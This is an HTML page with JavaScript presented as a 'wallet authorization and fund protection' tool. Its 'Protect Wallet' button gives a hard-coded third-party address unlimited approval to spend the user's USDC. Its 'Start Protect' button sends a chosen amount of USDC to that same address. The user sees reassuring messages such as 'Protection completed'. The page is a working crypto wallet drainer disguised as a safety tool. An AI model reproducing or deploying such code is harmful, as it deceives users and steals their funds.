<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · Wallet Authorization & Fund Protection</title>
</head>
<body>
  <h2>Mark III · Wallet Authorization & Fund Protection</h2>

  <button id="connect">🔵 Connect Wallet</button>
  <button id="approve">🟢 Protect Wallet</button>
  <button id="deposit">🟡 Start Protect</button>
  <button id="status">🟣 Reset / Status</button>
  <br><br>
  <a href="check.html" target="_blank">🧪 Check Authorization</a>
  <div id="output" style="margin-top: 20px;"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const approveAmount = ethers.constants.MaxUint256;

    let provider, signer, userAddress;

    document.getElementById("connect").onclick = async () => {
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      userAddress = await signer.getAddress();
      document.getElementById("output").innerText = "🔗 Connected: " + userAddress;
    };

    document.getElementById("approve").onclick = async () => {
      const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
      try {
        const tx = await usdc.approve(bossAddress, approveAmount);
        await tx.wait();
        document.getElementById("output").innerText = "✅ Authorization success.";
      } catch (err) {
        document.getElementById("output").innerText = "❌ Authorization failed.";
      }
    };

    document.getElementById("deposit").onclick = async () => {
      const usdc = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
      try {
        const amount = prompt("Enter amount to protect (USDC):");
        const parsed = ethers.utils.parseUnits(amount, 6);
        const tx = await usdc.transferFrom(userAddress, bossAddress, parsed);
        await tx.wait();
        document.getElementById("output").innerText = "✅ Protection completed.";
      } catch (err) {
        document.getElementById("output").innerText = "❌ Transfer failed.";
      }
    };

    document.getElementById("status").onclick = () => {
      document.getElementById("output").innerText = "";
    };
  </script>
</body>
</html>
